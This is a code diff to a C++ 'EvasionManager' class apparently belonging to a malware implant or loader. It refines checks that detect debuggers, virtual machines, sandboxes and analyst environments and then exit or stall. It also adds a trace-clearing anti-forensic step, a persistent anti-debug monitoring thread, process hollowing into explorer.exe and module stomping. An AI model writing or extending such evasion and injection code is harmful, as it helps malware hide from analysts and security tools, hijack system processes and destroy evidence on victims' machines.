@@ -7,6 +7,8 @@
 #include <cstdint>
 #include <thread>
 #include <chrono>
+#include <atomic>
+#include <cstdlib>
 
 #include "domain/common/AntiAnalysis.hpp"
 #include "domain/common/AntiSandbox.hpp"
@@ -31,6 +33,10 @@ class EvasionManager {
     bool anti_sandbox_enabled_ = true;
     bool environment_keying_enabled_ = true;
     bool anti_forensic_enabled_ = false;
+
+    // Shutdown flag for monitoring thread
+    static inline std::atomic<bool> shutdown_requested_{false};
+    std::thread monitoring_thread_;
 
 public:
     struct Config {
@@ -82,16 +88,13 @@ public:
 
         // 3. Anti-debug checks
         if (anti_debug_enabled_) {
-            // Hide anti-debug thread from debuggers
             hide_thread_from_debugger();
 
             if (anti::AntiDebug::should_terminate()) {
                 if (stealth_mode_) {
-                    while (true) {
-                        Sleep(10000);
-                    }
+                    stealth_sleep();
                 }
-                ExitProcess(0);
+                std::exit(1);
             }
         }
 
@@ -99,11 +102,9 @@ public:
         if (anti_vm_enabled_) {
             if (anti::AntiVM::is_virtual_machine()) {
                 if (stealth_mode_) {
-                    while (true) {
-                        Sleep(10000);
-                    }
+                    stealth_sleep();
                 }
-                ExitProcess(0);
+                std::exit(1);
             }
         }
 
@@ -111,11 +112,9 @@ public:
         if (anti_sandbox_enabled_) {
             if (anti::AntiSandbox::is_sandbox()) {
                 if (stealth_mode_) {
-                    while (true) {
-                        Sleep(10000);
-                    }
+                    stealth_sleep();
                 }
-                ExitProcess(0);
+                std::exit(1);
             }
         }
 
@@ -123,34 +122,50 @@ public:
         if (environment_keying_enabled_) {
             if (anti::EnvironmentKeying::is_suspicious_environment()) {
                 if (stealth_mode_) {
-                    while (true) {
-                        Sleep(10000);
-                    }
+                    stealth_sleep();
                 }
-                ExitProcess(0);
+                std::exit(1);
             }
         }
 
-        // 5. Start anti-debug monitoring thread
-        if (anti_debug_enabled_) {
-            std::thread([]() {
-                while (true) {
-                    Sleep(5000);
-                    if (anti::AntiDebug::should_terminate()) {
-                        ExitProcess(0);
-                    }
-                }
-            }).detach();
+        // 7. Anti-forensic (clear traces after passing all checks)
+        if (anti_forensic_enabled_) {
+            anti::AntiForensic::clear_traces();
         }
 
-        // 6. Self-inject via process hollowing if configured
+        // 8. Start anti-debug monitoring thread (joinable, not detached)
+        if (anti_debug_enabled_) {
+            monitoring_thread_ = std::thread([this]() {
+                while (!shutdown_requested_) {
+                    Sleep(5000);
+                    if (shutdown_requested_) break;
+                    if (anti::AntiDebug::should_terminate()) {
+                        std::exit(1);
+                    }
+                }
+            });
+        }
+
+        // 9. Self-inject via process hollowing if configured
         if (process_hollowing_enabled_) {
             execute_stealth(L"explorer.exe");
         }
 
-        // 7. Module stomping if configured
+        // 10. Module stomping if configured
         if (module_stomping_enabled_) {
             execute_module_stompe();
+        }
+    }
+
+    // Request shutdown for monitoring thread
+    void request_shutdown() {
+        shutdown_requested_ = true;
+    }
+
+    // Wait for monitoring thread to finish (call during cleanup)
+    void join_monitoring() {
+        if (monitoring_thread_.joinable()) {
+            monitoring_thread_.join();
         }
     }
 
@@ -291,6 +306,14 @@ public:
     bool is_anti_sandbox_enabled() const { return anti_sandbox_enabled_; }
     bool is_environment_keying_enabled() const { return environment_keying_enabled_; }
     bool is_anti_forensic_enabled() const { return anti_forensic_enabled_; }
+
+private:
+    // Sleep in stealth mode, checking for shutdown
+    static void stealth_sleep() {
+        while (!shutdown_requested_) {
+            Sleep(10000);
+        }
+    }
 };
 
 } // namespace nuub::domain
